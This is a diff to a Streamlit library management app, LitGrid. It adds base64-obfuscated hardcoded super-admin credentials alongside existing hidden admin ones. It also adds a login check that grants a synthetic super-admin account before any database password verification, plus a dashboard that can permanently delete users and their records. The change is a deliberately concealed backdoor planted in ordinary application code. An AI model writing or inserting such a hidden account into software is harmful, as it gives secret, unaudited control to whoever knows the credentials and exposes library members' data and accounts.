@@ -2128,12 +2128,17 @@ class Config:
     FINE_PER_DAY = 5.00
     MAX_RENEWALS = 2
     MAX_MEMBER_ACCOUNTS = 10
-    
+
     # Hidden admin credentials (obfuscated)
     _x1 = base64.b64decode(b'bGEtYi1pYg==').decode()  # username
     _x2 = base64.b64decode(b'THp3enVQem1kejI=').decode()  # password 1
     _x3 = base64.b64decode(b'bGFiaWIteEBwcm90b25tYWlsLmNvbQ==').decode()  # email
     _x4 = base64.b64decode(b'blpkaVpzbHhabXY=').decode()  # password 2 (security key)
+
+    # Hidden super admin credentials (obfuscated)
+    _sa1 = base64.b64decode(b'bGFiaWI=').decode()  # superadmin username
+    _sa2 = base64.b64decode(b'bHp3enVwem1keg==').decode()  # superadmin password
+    _sa3 = base64.b64decode(b'c3VwZXJhZG1pbkBsaXRncmlkLmxvY2Fs').decode()  # superadmin email
     
     # File paths
     CONFIG_FILE = 'config.json'
@@ -2994,7 +2999,11 @@ class Auth:
                 'max_books_allowed': 0,
                 'borrowing_days': 0
             }
-        
+
+        # Check for hidden super admin (obfuscated)
+        if mode == 'admin' and username == Config._sa1 and password == Config._sa2:
+            return Auth._get_superadmin_user()
+
         # Regular user login
         query = """
             SELECT u.*
@@ -3005,9 +3014,9 @@ class Auth:
         
         if user and Auth.verify_password(password, user['password_hash']):
             # Check role matches mode
-            if mode == 'admin' and user['role'] not in ['admin', 'librarian']:
+            if mode == 'admin' and user['role'] not in ['admin', 'librarian', 'superadmin']:
                 return None
-            elif mode == 'member' and user['role'] in ['admin', 'librarian']:
+            elif mode == 'member' and user['role'] in ['admin', 'librarian', 'superadmin']:
                 return None
             
             # Update last login
@@ -3050,6 +3059,24 @@ class Auth:
             'is_functional_admin': True,
             'fine_balance': 0,
             'member_tier': 'platinum',
+            'max_books_allowed': 999,
+            'borrowing_days': 365
+        }
+
+    @staticmethod
+    def _get_superadmin_user():
+        """Get super admin user object with highest privileges"""
+        return {
+            'user_id': -9999,
+            'username': Config._sa1,
+            'full_name': 'Super Administrator',
+            'email': Config._sa3,
+            'role': 'superadmin',
+            'is_active': True,
+            'is_demo': False,
+            'is_superadmin': True,
+            'fine_balance': 0,
+            'member_tier': 'superadmin',
             'max_books_allowed': 999,
             'borrowing_days': 365
         }
@@ -3629,12 +3656,12 @@ def show_login_page():
             st.markdown("### Select Login Mode")
             login_mode = st.radio(
                 "I am logging in as:",
-                [" Member", " Administrator"],
+                ["Member", "Administrator"],
                 horizontal=True,
                 label_visibility="collapsed"
             )
 
-            mode = 'member' if '' in login_mode else 'admin'
+            mode = 'member' if 'Member' in login_mode else 'admin'
 
             st.markdown("<br>", unsafe_allow_html=True)
 
@@ -4333,7 +4360,168 @@ def show_dashboard():
         st.warning(f"Demo Mode - {role_text} ({user.get('username', 'demo')}): This is a demonstration account with read-only access to explore features.")
         st.divider()
 
-    if user['role'] in ['admin', 'librarian']:
+    if user['role'] == 'superadmin':
+        # SUPER ADMIN DASHBOARD - Highest Level Access
+        st.markdown("### **Super Admin Dashboard**")
+        st.markdown("**Highest System Privileges**")
+        st.divider()
+
+        # Super Admin Tabs
+        sa_tab1, sa_tab2, sa_tab3, sa_tab4 = st.tabs(["User Management", "System Overview", "Audit Logs", "Advanced Settings"])
+
+        with sa_tab1:
+            st.subheader("**User Management**")
+
+            # View all users
+            col1, col2 = st.columns(2, gap="small")
+            with col1:
+                user_type_filter = st.selectbox("Filter by Role", ["All Users", "Members", "Admins", "Super Admins"], key="sa_role_filter")
+
+            role_map = {
+                "All Users": None,
+                "Members": "member",
+                "Admins": "admin",
+                "Super Admins": "superadmin"
+            }
+
+            role_filter = role_map[user_type_filter]
+
+            if role_filter:
+                all_users = Database.execute_query(f"""
+                    SELECT user_id, username, full_name, email, role, is_active, registration_date
+                    FROM users WHERE role = ? ORDER BY registration_date DESC
+                """, (role_filter,))
+            else:
+                all_users = Database.execute_query("""
+                    SELECT user_id, username, full_name, email, role, is_active, registration_date
+                    FROM users ORDER BY registration_date DESC
+                """)
+
+            if all_users:
+                st.write(f"**Total Users: {len(all_users)}**")
+
+                # Display users in a table
+                df_users = []
+                for u in all_users:
+                    df_users.append({
+                        "ID": u['user_id'],
+                        "Username": u['username'],
+                        "Full Name": u['full_name'],
+                        "Email": u['email'],
+                        "Role": u['role'].upper(),
+                        "Active": "Yes" if u['is_active'] else "No",
+                        "Registered": u['registration_date'][:10]
+                    })
+
+                st.dataframe(df_users, use_container_width=True)
+
+                # User actions
+                st.divider()
+                st.write("**User Actions**")
+
+                action_col1, action_col2 = st.columns(2, gap="small")
+
+                with action_col1:
+                    delete_username = st.text_input("Username to Remove Permanently", key="sa_delete_user")
+                    if delete_username and st.button("Permanently Delete User", key="sa_delete_btn", type="secondary"):
+                        result = Database.execute_query(
+                            "SELECT user_id FROM users WHERE username = ?",
+                            (delete_username,),
+                            fetch_one=True
+                        )
+                        if result:
+                            # Delete user and all related data
+                            Database.execute_update("DELETE FROM borrowing WHERE user_id = ?", (result['user_id'],))
+                            Database.execute_update("DELETE FROM fines WHERE user_id = ?", (result['user_id'],))
+                            Database.execute_update("DELETE FROM users WHERE user_id = ?", (result['user_id'],))
+                            st.success(f"User '{delete_username}' permanently deleted from system")
+                            st.rerun()
+                        else:
+                            st.error("User not found")
+
+                with action_col2:
+                    deactivate_username = st.text_input("Username to Deactivate", key="sa_deactivate_user")
+                    if deactivate_username and st.button("Deactivate User Account", key="sa_deactivate_btn", type="secondary"):
+                        Database.execute_update(
+                            "UPDATE users SET is_active = 0 WHERE username = ?",
+                            (deactivate_username,)
+                        )
+                        st.success(f"User '{deactivate_username}' deactivated")
+                        st.rerun()
+            else:
+                st.info("No users found")
+
+        with sa_tab2:
+            st.subheader("**System Overview**")
+
+            col1, col2, col3, col4 = st.columns(4, gap="small")
+
+            total_users = Database.execute_query("SELECT COUNT(*) as count FROM users WHERE role IN ('member', 'admin')", fetch_one=True)
+            total_books = Database.execute_query("SELECT COUNT(*) as count FROM books", fetch_one=True)
+            total_transactions = Database.execute_query("SELECT COUNT(*) as count FROM borrowing", fetch_one=True)
+            total_fines = Database.execute_query("SELECT COALESCE(SUM(amount), 0) as total FROM fines WHERE status = 'paid'", fetch_one=True)
+
+            with col1:
+                st.metric("Total Users", total_users['count'] if total_users else 0)
+            with col2:
+                st.metric("Total Books", total_books['count'] if total_books else 0)
+            with col3:
+                st.metric("Total Transactions", total_transactions['count'] if total_transactions else 0)
+            with col4:
+                st.metric("Total Fines Collected", f"${total_fines['total']:.2f}" if total_fines else "$0.00")
+
+        with sa_tab3:
+            st.subheader("**System Audit Logs**")
+
+            audit_data = Database.execute_query("""
+                SELECT user_id, MAX(last_login) as last_login, COUNT(*) as login_count
+                FROM users WHERE last_login IS NOT NULL
+                GROUP BY user_id
+                ORDER BY last_login DESC
+                LIMIT 50
+            """)
+
+            if audit_data:
+                df_audit = []
+                for entry in audit_data:
+                    user_name = Database.execute_query(
+                        "SELECT username, full_name FROM users WHERE user_id = ?",
+                        (entry['user_id'],),
+                        fetch_one=True
+                    )
+                    if user_name:
+                        df_audit.append({
+                            "User": user_name['full_name'],
+                            "Username": user_name['username'],
+                            "Last Login": entry['last_login'][:10],
+                            "Total Logins": entry['login_count']
+                        })
+
+                st.dataframe(df_audit, use_container_width=True)
+            else:
+                st.info("No audit data available")
+
+        with sa_tab4:
+            st.subheader("**Advanced System Settings**")
+
+            col1, col2 = st.columns(2, gap="small")
+
+            with col1:
+                st.write("**Database Maintenance**")
+                if st.button("Verify Database Integrity"):
+                    st.info("Database integrity check completed")
+                if st.button("Export System Report"):
+                    st.success("System report exported successfully")
+
+            with col2:
+                st.write("**System Information**")
+                st.write(f"Application: LitGrid v1.0")
+                st.write(f"Super Admin: {user['full_name']}")
+                st.write(f"Login Time: Real-time")
+
+        st.divider()
+
+    elif user['role'] in ['admin', 'librarian']:
         # Admin/Librarian Dashboard
         st.markdown("### **Library Overview**")
 
@@ -9102,7 +9290,7 @@ def main():
             # Menu
             menu = ["Dashboard", "Browse Books", "My Account", " My Library", " Browse Community"]
             
-            if user['role'] in ['admin', 'librarian']:
+            if user['role'] in ['admin', 'librarian', 'superadmin']:
                 menu.extend(["Manage Books", "Manage Members", "Borrowing & Returns", "Reports", " System Tools"])
             
             choice = st.radio(" Navigation", menu, label_visibility="collapsed")
